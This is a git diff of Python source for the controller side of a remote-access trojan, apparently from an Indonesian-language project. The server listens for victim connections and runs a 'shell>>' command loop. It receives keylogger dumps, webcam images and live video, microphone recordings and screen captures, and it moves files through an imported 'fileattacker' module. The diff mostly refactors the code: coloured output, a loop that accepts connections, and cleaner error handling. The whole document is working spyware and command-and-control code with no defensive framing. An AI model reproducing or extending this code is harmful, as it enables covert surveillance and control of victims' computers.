@@ -13,35 +13,47 @@ import sys
 import threading
 import time
 from fileattacker import download_file, upload_file
+from termcolor import cprint
 
 def main_con():
+    soc = None
     try:
         soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         soc.bind(('0.0.0.0', 9999))
-        print('Waiting for connection')
         soc.listen(1)
-        koneksi = soc.accept()
-        _target = koneksi[0]
-        ip = koneksi[1]
-        print(f'Connected to {str(ip)}')
-        return _target
-    except KeyboardInterrupt:
-        print('exiting listener')
-        sys.exit()
+        cprint('Waiting for connection', 'blue')
 
-_target = main_con()
+        while True:
+            conn, addr = soc.accept()
+            cprint(f'Connected {addr}', 'green')
+
+            try:
+                shellc(conn)
+            except Exception as e:
+                print(f'{e}')
+            finally:
+                conn.close()
+    except KeyboardInterrupt:
+        exit('exiting listener')
+    except Exception as e:
+        print(f'{e}')
+    finally:
+        if soc:
+            soc.close()
+
 main_log = threading.Event()
 
 def start_log():
-    print("starting logger")
+    cprint("starting logger", 'blue')
     time.sleep(0.5)
-    print("logger started")
+    cprint("logger started", 'green')
 
     main_log.set()
 
 def baca_log():
     if not main_log.is_set():
-        print("error, the main function is not running")
+        cprint("error, the main function is not running > start_log", 'red')
         return
     
     print("\n")
@@ -50,22 +62,33 @@ def baca_log():
 
 def stop_log():
     if not main_log.is_set():
-        print("error, the main function is not running")
+        cprint("error, the main function is not running > start_log", 'red')
         return
 
-    print("stopping logger")
+    cprint("stopping logger", 'blue')
     time.sleep(0.5)
-    print("logger stopped")
+    cprint("logger stopped", 'green')
 
     main_log.clear()
 
-def recv_keylog():
+def recv_keylog(_target):
     try:
-        print("Dumping logs:")
-        data = _target.recv(1024).decode()
+        _target.settimeout(10.0)
+        cprint("Dumping logs:", 'yellow')
+        raw_data = _target.recv(1024)
+
+        if not raw_data:
+            cprint('connection closed', 'red')
+            return None
+        data = raw_data.decode()
         print(data)
+    
     except socket.timeout:
-        print("No dump received, continuing")
+        cprint("No dump received, continuing", 'red')
+        return None
+    except OSError as e:
+        cprint(f'error: {e}', 'red')
+        return None
 
 def start_image_server(host="0.0.0.0", port=9993, save_as="hasil.jpg"):
     try:
@@ -74,9 +97,9 @@ def start_image_server(host="0.0.0.0", port=9993, save_as="hasil.jpg"):
         server.bind((host, port))
         server.listen(1)
 
-        print("connecting")
+        cprint("connecting", 'blue')
         conn, addr = server.accept()
-        print(f"connected {addr}")
+        cprint(f"connected {addr}", 'green')
 
         size_data = conn.recv(4)
         size = struct.unpack("!I", size_data)[0]
@@ -91,27 +114,27 @@ def start_image_server(host="0.0.0.0", port=9993, save_as="hasil.jpg"):
         with open(save_as, "wb") as f:
             f.write(data)
 
-        print(f'saved as {save_as}')
+        cprint(f'saved as {save_as}', 'yellow')
 
         conn.close()
         server.close()
     except socket.timeout:
-        print("Can't access camera")
+        cprint("Can't access camera", 'red')
 
 
 def keystroke():
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.bind(('0.0.0.0', 9995))
         s.listen(1)
-        print('Connect')
+        cprint('Connecting', 'blue')
         conn, addr= s.accept()
         with conn:
-            print(f'connected {addr}')
+            cprint(f'connected {addr}', 'green')
             while True:
                     command = input('text: ')
                     conn.sendall(command.encode())
                     break
-    print('send')
+    cprint('sent', 'yellow')
 
 FORMAT = pyaudio.paInt16
 CHANNELS = 1
@@ -124,15 +147,16 @@ def receive_and_save(WAVE_OUTPUT):
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             s.bind(('0.0.0.0', 9996))
             s.listen(1)
+            cprint('connecting', 'blue')
             conn, addr = s.accept()
             with conn:
-                    print(f'connect {addr}')
+                    cprint(f'connect {addr}', 'green')
                     while True:
                         data = conn.recv(CHUNK)
                         if not data:
                             break
                         frames.append(data)
-        print('saving WAV file')
+        cprint('saving WAV file', 'yellow')
         with wave.open(WAVE_OUTPUT, 'wb') as wf:
             wf.setnchannels(CHANNELS)
             wf.setsampwidth(2)
@@ -140,7 +164,7 @@ def receive_and_save(WAVE_OUTPUT):
             wf.writeframes(b''.join(frames))
         print(f'{WAVE_OUTPUT}')
     except socket.error as e:
-        print(f'{e}')
+        cprint(f'{e}', 'red')
 
 def screen_record(host="0.0.0.0", port=9999):
     MAX_WIDTH = 960
@@ -149,9 +173,9 @@ def screen_record(host="0.0.0.0", port=9999):
     server.bind((host, port))
     server.listen(1)
 
-    print("connecting")
+    cprint("connecting", 'blue')
     conn, addr = server.accept()
-    print(f"connected {addr}") 
+    cprint(f"connected {addr}", 'green') 
 
     data = b""
     payload_size = struct.calcsize("Q")
@@ -184,11 +208,11 @@ def screen_record(host="0.0.0.0", port=9999):
 
             key = cv2.waitKey(1) & 0xFF
             if key == ord('q') or key == 27:
-                print("stopped")
+                cprint("stopped", 'yellow')
                 break
 
         except Exception as e:
-            print("error", e)
+            cprint(f'{e}', 'red')
             break
 
     conn.close()
@@ -199,10 +223,11 @@ def konversi_byte_stream():
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.bind(('0.0.0.0', 9998))
     sock.listen(1)
+    cprint('connecting', 'blue')
     konek = sock.accept()
     tg = konek[0]
     ip = konek[1]
-    print(f'connected {ip}')
+    cprint(f'connected {ip}', 'green')
     bdata = b""
     payload_size = struct.calcsize("Q")
     try:
@@ -223,13 +248,14 @@ def konversi_byte_stream():
                 cv2.imshow("streaming / press Q to quit", frame)
                 key = cv2.waitKey(1)
                 if key & 0xFF == ord('q'):
+                    cprint('stopped', 'yellow')
                     break 
         tg.close()
         cv2.destroyAllWindows()
     except:
-        print("Can't access camera")
+        cprint("Can't access camera", 'red')
 
-def data_diterima():
+def data_diterima(_target):
         data = ''
         while True:
             try:
@@ -240,11 +266,11 @@ def data_diterima():
             except socket.timeout:
                  continue
 
-def shellc():
+def shellc(_target):
     x = 0                      
     n = 0
     p = 0
-    print("Type 'help' for help")
+    cprint("Type 'help' for help", 'yellow')
     while True:
         try:
             perintah = input('shell>> ')
@@ -277,8 +303,7 @@ def shellc():
             elif perintah == 'screen_share':
                 screen_record(host='0.0.0.0', port=9991) 
             elif perintah == 'help':
-                print("""
-                    
+                cprint("""
                         basic command:
                     ================================
                     -exit/quit >> exit
@@ -337,7 +362,7 @@ def shellc():
                       
                     -pidkill    >> kill program by pid name
                     ================================
-                    """)
+                    """, 'yellow')
             elif perintah == 'rec_audio':
                 p += 1
                 receive_and_save('retrieved_audio'+str(p)+'.wav')
@@ -353,24 +378,9 @@ def shellc():
             elif perintah[:7] == 'pidkill':
                 pass
             else:
-                hasil = data_diterima()
+                hasil = data_diterima(_target)
                 print(hasil)
-        except ConnectionResetError:
-            print('Connection closed')
-            break  
-        except BrokenPipeError:
-            print("Broken Pipe error")
-            break
-        except ConnectionRefusedError:
-            print("Connection refused")
-            break
-        except ConnectionError:
-            print("Connection error")
-            break
-        except ConnectionAbortedError:
-            print("Connection aborted")
-            break        
-        except KeyboardInterrupt:
-            print("\n")
-            pass
-shellc()
+        except Exception as e:
+            print(f"[error] {e}")
+
+main_con()
